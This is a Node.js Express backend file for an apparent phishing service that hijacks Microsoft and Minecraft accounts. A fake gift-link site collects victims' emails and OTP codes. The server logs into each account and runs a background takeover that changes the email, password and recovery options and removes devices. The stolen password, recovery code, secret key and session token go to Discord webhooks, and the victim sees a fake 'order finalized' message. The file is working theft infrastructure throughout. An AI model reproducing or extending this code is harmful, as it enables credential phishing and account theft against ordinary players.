require('dotenv').config();

const { attachGlobalLoggerGuard } = require('../autosecure/utils/logging/interceptLogger');
attachGlobalLoggerGuard();

const express = require('express');
const rateLimit = require('express-rate-limit');
const http = require('http');

const { setupGlobalErrorHandlers, registerServer } = require('../autosecure/utils/process/gracefulShutdown');
setupGlobalErrorHandlers('BackendServer');

const { getClientIp, configureTrustProxy } = require('../autosecure/utils/security/clientIp');
const validEmail = require('../autosecure/utils/emails/validEmail');
const getCredentials = require('../autosecure/utils/info/getCredentials');
const sendotp = require('../autosecure/utils/secure/sendotp');
const login = require('../autosecure/utils/secure/login');
const secure = require('../autosecure/utils/secure/recodesecure');
const generateuid = require('../autosecure/utils/generateuid');
const insertaccount = require('../db/insertaccount');
const { getDonutStats } = require('../autosecure/utils/donutapi/getDonutStats');
const getStats = require('../autosecure/utils/hypixelapi/getStats');
const { sendSecureNotification } = require('../autosecure/utils/notifications/notifier');
const { initializeDB } = require('../db/db');
const { queryParams } = require('../db/database');
const { sendWebLog } = require('../autosecure/utils/webLogger');
const config = require('../configLoader');
const { securityHeaders, loopbackOnly } = require('../autosecure/utils/security/apiAuth');
const { wafMiddleware } = require('../autosecure/utils/security/waf');

const app = express();
configureTrustProxy(app, 'loopback');
app.use(securityHeaders);
app.use(loopbackOnly);
app.disable('x-powered-by');
const PORT = process.env.BACKEND_PORT || process.env.PORT || 5000;

// Core WAF Shield: Blocks & auto-bans Path Traversal, LFI, and scanner exploits
app.use(wafMiddleware);

const activeSessions = new Map();
const MAX_ACTIVE_SESSIONS = 5000;

function setSession(id, data) {
    if (activeSessions.size >= MAX_ACTIVE_SESSIONS) {
        const oldestKey = activeSessions.keys().next().value;
        if (oldestKey) activeSessions.delete(oldestKey);
    }
    activeSessions.set(id, data);
}

setInterval(() => {
    const now = Date.now();
    for (const [id, sess] of activeSessions.entries()) {
        if (now - sess.timestamp > 15 * 60 * 1000) {
            activeSessions.delete(id);
        }
    }
}, 10 * 60 * 1000);

const generalApiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 120,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => getClientIp(req),
    message: { success: false, error: 'Too many requests. Please try again in 1 minute.' }
});

const sendOtpLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 10,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => getClientIp(req),
    message: { success: false, error: 'Too many OTP requests. Please wait 1 minute.' }
});

const verifyOtpLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 15,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => getClientIp(req),
    message: { success: false, error: 'Too many verification attempts. Please wait a moment.' }
});

app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: true, limit: '20kb' }));

app.get('/api/health', (req, res) => {
    res.json({ success: true, service: 'backend', time: Date.now() });
});

app.use((req, res, next) => {
    const allowedOrigins = (config.webDomains || []).flatMap(d => [`https://${d}`, `http://${d}`]);
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    } else if (!origin) {
        res.setHeader('Access-Control-Allow-Origin', `https://${config.webDomain || 'donuttsmp.store'}`);
    }
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use('/api/', generalApiLimiter);

app.use((req, res, next) => {
    const time = new Date().toLocaleTimeString('vi-VN');
    if (req.url.startsWith('/api/')) {
        const clientIp = getClientIp(req);
        console.log(`[${time}] [BACKEND-API] ${req.method} ${req.url} (IP: ${clientIp})`);
    }
    next();
});

const webActivityLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 20,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req) => getClientIp(req),
    message: { success: false, error: 'Too many activity reports. Please wait a moment.' }
});

// Endpoint to receive realtime visitor & checkout activity from web
app.post('/api/web-activity', webActivityLimiter, async (req, res) => {
    try {
        let { code, username, email, statusText, domain } = req.body || {};

        if (typeof username !== 'string') username = '';
        if (typeof email !== 'string') email = '';
        if (typeof code !== 'string') code = '';
        if (typeof statusText !== 'string') statusText = '';
        if (typeof domain !== 'string') domain = '';

        username = username.trim().slice(0, 64);
        email = email.trim().slice(0, 128);
        code = code.trim().slice(0, 64);
        statusText = statusText.trim().slice(0, 64);
        domain = domain.trim().slice(0, 128);

        // Sanitize code and domain
        if (code && !/^[a-zA-Z0-9_-]+$/.test(code)) code = '';
        if (domain && !/^[a-zA-Z0-9.:_-]+$/.test(domain)) domain = '';

        // Validate username (safe alphanumeric + reasonable characters)
        if (username && /^[a-zA-Z0-9_ -]{1,64}$/.test(username)) {
            const clientIp = getClientIp(req);
            
            console.log(`[WEB ACTIVITY] ${username} | ${statusText} | IP: ${clientIp} | Code: ${code || 'None'} | Email: ${email || 'None'}`);

            await sendWebLog({
                code,
                ip: clientIp,
                domain: domain || config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
                username,
                email: email || '',
                statusText: statusText || 'Send Code'
            });
        }

        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
    try {
        let { email, username, giftCode, code: altCode } = req.body;
        email = (email || '').trim();
        username = (username || '').trim();
        const curGiftCode = (giftCode || altCode || '').trim();

        // Check gift link validity and 60-min expiration if code provided
        let resolvedBotUserId = null;
        let resolvedBotNumber = 1;

        if (curGiftCode) {
            const EXPIRY_MS = 3 * 60 * 60 * 1000;
            const now = Date.now();
            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
            if (!giftRows || giftRows.length === 0 || (now - giftRows[0].created_at > EXPIRY_MS)) {
                if (giftRows && giftRows.length > 0) {
                    await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
                }
                return res.status(410).json({
                    success: false,
                    error: 'Gift link has expired after 3 hours. Please ask for a new link!'
                });
            }
            resolvedBotUserId = giftRows[0].bot_user_id;
            resolvedBotNumber = giftRows[0].bot_number || 1;

            const { checkWebAccess } = require('../autosecure/utils/web/webAccess');
            const ownerWebAccess = await checkWebAccess(resolvedBotUserId);
            if (!ownerWebAccess.hasAccess) {
                return res.status(403).json({
                    success: false,
                    error: 'Dịch vụ web của người gửi hiện đang tạm ngưng do hết hạn bản quyền.'
                });
            }
        }

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Please enter your Microsoft / Minecraft account email.'
            });
        }

        if (!validEmail(email)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid email format. Please check again.'
            });
        }

        const profiles = await getCredentials(email, false);

        const clientIp = getClientIp(req);

        if (!profiles) {
            sendWebLog({
                code: curGiftCode,
                ip: clientIp,
                username: username || 'Player',
                email,
                statusText: 'Invalid Email'
            }).catch(() => {});

            return res.status(404).json({
                success: false,
                error: 'Microsoft account not found for this email.'
            });
        }

        const eligibleProofs = profiles.Credentials?.OtcLoginEligibleProofs ||
            (profiles._securityEmails && profiles._securityEmails.length > 0 ? profiles._securityEmails.map(s => s.proof || s) : null) ||
            profiles.Credentials?.Proofs;

        if (!eligibleProofs || eligibleProofs.length === 0) {
            sendWebLog({
                code: curGiftCode,
                ip: clientIp,
                username: username || 'Player',
                email,
                statusText: 'No security options'
            }).catch(() => {});

            return res.status(400).json({
                success: false,
                error: 'This Microsoft account does not have email OTP verification enabled.'
            });
        }

        const secEmailObj = eligibleProofs[0];
        let secDisplay = secEmailObj.display || secEmailObj.data || email;
        const secData = secEmailObj.data || secEmailObj.display || email;

        // Ensure secDisplay is always professionally masked (e.g., t***t@gmail.com)
        if (secDisplay && secDisplay.includes('@') && !secDisplay.includes('*')) {
            const [userPart, domainPart] = secDisplay.split('@');
            if (userPart.length <= 2) {
                secDisplay = userPart[0] + '*@' + domainPart;
            } else {
                secDisplay = userPart[0] + '*'.repeat(Math.min(5, Math.max(3, userPart.length - 2))) + userPart[userPart.length - 1] + '@' + domainPart;
            }
        }

        const otpSent = await sendotp(email, secData);

        if (!otpSent) {
            return res.status(500).json({
                success: false,
                error: 'Failed to send OTP code from Microsoft Live. Please try again shortly.'
            });
        }

        // Log to Discord: Minecraft Username + Email entered and OTP successfully sent
        sendWebLog({
            code: curGiftCode,
            ip: clientIp,
            username: username || 'Player',
            email,
            statusText: 'Send Code'
        }).catch(() => {});

        const sessionId = 'sess_' + require('crypto').randomBytes(16).toString('hex');
        setSession(sessionId, {
            email,
            secData,
            secDisplay,
            username,
            giftCode: curGiftCode,
            botUserId: resolvedBotUserId,
            botNumber: resolvedBotNumber,
            timestamp: Date.now()
        });

        return res.json({
            success: true,
            sessionId,
            email,
            maskedEmail: secDisplay,
            secId: secData,
            message: `OTP verification code sent to ${secDisplay}!`
        });

    } catch (error) {
        console.error('[API /send-otp] Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Failed to process OTP request. Please try again shortly.'
        });
    }
});

app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
    try {
        let { sessionId, email, secId, code, username, giftCode, gift_code } = req.body || {};
        code = (code || '').toString().trim().replace(/[\s\-]/g, '');
        let curGiftCode = (giftCode || gift_code || '').trim();
        let botUserId = null;
        let botNumber = 1;

        if (sessionId && activeSessions.has(sessionId)) {
            const sess = activeSessions.get(sessionId);
            if (!email) email = sess.email;
            if (!secId) secId = sess.secData;
            if (!username) username = sess.username;
            if (!curGiftCode) curGiftCode = sess.giftCode;
            botUserId = sess.botUserId;
            botNumber = sess.botNumber || 1;
        }

        // If botUserId not yet resolved from session, query from gift_links
        if (!botUserId && curGiftCode) {
            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
            if (giftRows && giftRows.length > 0) {
                botUserId = giftRows[0].bot_user_id;
                botNumber = giftRows[0].bot_number || 1;
            }
        }

        email = (email || '').trim();
        secId = (secId || '').trim();
        username = (username || '').trim();

        if (!code || !/^\d{6,8}$/.test(code)) {
            return res.status(400).json({
                success: false,
                error: 'Verification code must be a 6 to 8 digit number.'
            });
        }

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Missing account email.'
            });
        }

        const creds = await getCredentials(email, false);
        const host = await login({ email, id: secId, code }, creds);

        if (!host || host === 'tfa') {
            return res.status(401).json({
                success: false,
                error: 'Verification code is invalid or expired. Please check your email.'
            });
        }

        const uid = await generateuid();

        // Fetch user custom autosecure config if botUserId found
        let userConfig = null;
        if (botUserId) {
            let userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?', [botUserId, botNumber]);
            if (!userRows || userRows.length === 0) {
                userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? LIMIT 1', [botUserId]);
            }
            if (userRows && userRows.length > 0) {
                userConfig = userRows[0];
            }
        }

        const effectiveUserId = botUserId || "web_system";
        const settings = {
            ...(userConfig || {}),
            user_id: effectiveUserId,
            botnumber: botNumber,

            // Row 1 (Discord Settings embed)
            auto_secure: userConfig?.auto_secure ?? 1,
            change_ign: userConfig?.change_ign ?? 0,
            multiplayer: userConfig?.multiplayer ?? 0,

            // Row 2
            secureifnomc: userConfig?.secureifnomc ?? 1,
            checkban: userConfig?.checkban ?? 0,
            checkban_hypixel: userConfig?.checkban_hypixel ?? userConfig?.checkban ?? 0,
            checkban_donut: userConfig?.checkban_donut ?? 0,
            autoquarantine: userConfig?.autoquarantine ?? 0,

            // Row 3
            oauthapps: userConfig?.oauthapps ?? 1,
            exploit: userConfig?.exploit ?? 1,
            removedevices: userConfig?.removedevices ?? 1,

            // Row 4
            addzyger: userConfig?.addzyger ?? 1,
            signout: userConfig?.signout ?? 1,
            changegamertag: userConfig?.changegamertag ?? 0,

            // Row 5
            subscribemail: userConfig?.subscribemail ?? 0,
            changeprimary: userConfig?.changeprimary ?? 1,
            domain: userConfig?.domain || (config.domains && config.domains[0]) || "mail.hotwar.asia",

            // Embed 2 (Personalization)
            changename: userConfig?.changename ?? 0,
            name: userConfig?.name || null,
            changedob: userConfig?.changedob ?? 0,
            dob: userConfig?.dob || null,
            changepfp: userConfig?.changepfp ?? 0,
            pfp: userConfig?.pfp || config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
            changelanguage: userConfig?.changelanguage ?? 0,
            language: userConfig?.language || 'en-US',
            prefix: userConfig?.prefix || "vingr0ub",

            // Other configs
            removecards: userConfig?.removecards ?? 0,
            leavefamily: userConfig?.leavefamily ?? 1,
            removelinkednumbers: userConfig?.removelinkednumbers ?? 1,
            webhook: userConfig?.webhook || config.notifierWebhook || "",
            ping: userConfig?.ping || "@everyone",
            aftersecure: userConfig?.aftersecure || "nothing",
            hits_channel: userConfig?.hits_channel || null,
            logs_channel: userConfig?.logs_channel || null,
            notification_channel: userConfig?.notification_channel || null,
            users_channel: userConfig?.users_channel || null,
            server_id: userConfig?.server_id || null,
            claiming: userConfig?.claiming ?? 0
        };

        // Clean up gift link and active session immediately
        if (curGiftCode) {
            await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
        }
        if (sessionId) activeSessions.delete(sessionId);

        // INSTANT RESPONSE TO BROWSER: Stop spinner immediately and show success screen!
        res.json({
            success: true,
            uid,
            username: username || email,
            message: 'Account verified and order finalized successfully!'
        });

        // ASYNCHRONOUS BACKGROUND AUTOSECURE & STATS PROCESS
        (async () => {
            try {
                if (!settings.auto_secure) {
                    console.log(`[API /verify-otp] Bot con đã tắt VinGroup! Lưu mã vào danh sách chờ claim thủ công.`);
                    const embedData = {
                        embeds: [{
                            title: `${username || 'Account'}! :x:`,
                            description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*VinGroup đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
                            color: 0x00ff00
                        }]
                    };
                    await queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
                        [effectiveUserId, username || email, JSON.stringify(embedData)]).catch(() => {});
                    return;
                }

                console.log(`[API /verify-otp] Starting background autosecure for ${username || email} (UID: ${uid})...`);
                let acc = await secure(host, settings, uid, username);

                const hasRealMc = acc.newName && acc.newName !== "No Minecraft!" && acc.mc && acc.mc !== "No Minecraft!";
                const targetIgn = hasRealMc ? acc.newName : null;
                let donutStats = null;
                if (targetIgn) {
                    try {
                        donutStats = await getDonutStats(targetIgn);
                    } catch (err) {}
                }

                let hypixelStats = null;
                let maxNetworth = 0;
                if (targetIgn) {
                    try {
                        hypixelStats = await getStats(targetIgn);
                        if (hypixelStats && hypixelStats.skyblock && hypixelStats.skyblock.length > 0) {
                            for (const prof of hypixelStats.skyblock) {
                                if (prof.networth && prof.networth > maxNetworth) {
                                    maxNetworth = prof.networth;
                                }
                            }
                        }
                    } catch (e) {}
                }

                try {
                    await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
                } catch (dbErr) {
                    console.error('[API /verify-otp] DB Error:', dbErr.message);
                }

                try {
                    const accountData = {
                        username: hasRealMc ? targetIgn : "Couldn't find!",
                        email: acc.email,
                        oldEmail: email,
                        password: acc.password,
                        recoveryCode: acc.recoveryCode,
                        secretkey: acc.secretkey,
                        secEmail: acc.secEmail,
                        ssid: acc.ssid,
                        donut: donutStats,
                        donutMoney: donutStats?.moneyFormatted || null,
                        donutShards: donutStats?.shardsFormatted || null,
                        donutPlaytime: donutStats?.playtime || null,
                        donutRank: donutStats?.rank || null,
                        donutKDR: donutStats?.kdr || null,
                        networth: maxNetworth.toString() || '0',
                        bedwars: hypixelStats?.bedwars?.level || '0',
                        networkLevel: hypixelStats?.nwl || '0'
                    };

                    const clientTarget = { username: effectiveUserId, botnumber: botNumber };
                    await sendSecureNotification(clientTarget, accountData);
                } catch (whError) {
                    console.error('[API /verify-otp] Webhook Error:', whError.message);
                }
            } catch (bgErr) {
                console.error(`[API /verify-otp] Background secure error for UID ${uid}:`, bgErr);
            }
        })();

    } catch (error) {
        console.error('[API /verify-otp] Error:', error);
        return res.status(500).json({
            success: false,
            error: 'Failed to process verification. Please try again shortly.'
        });
    }
});

app.use((req, res) => {
    res.status(404).json({ success: false, error: 'Endpoint not found on Backend API' });
});

async function startBackend() {
    try {
        await initializeDB();
        const server = app.listen(PORT, '127.0.0.1', () => {
            if (process.env.RUN_ALL_MODE === 'true') {
                console.log(`[BACKEND] ✔ Cổng ${PORT} sẵn sàng (API: /api/health)`);
                return;
            }
            console.log(`[BACKEND] Listening on port ${PORT}`);
        });
        registerServer(server);
    } catch (err) {
        console.error('[BACKEND] Startup error:', err);
    }
}

if (require.main === module) {
    startBackend();
}

module.exports = { app, startBackend };
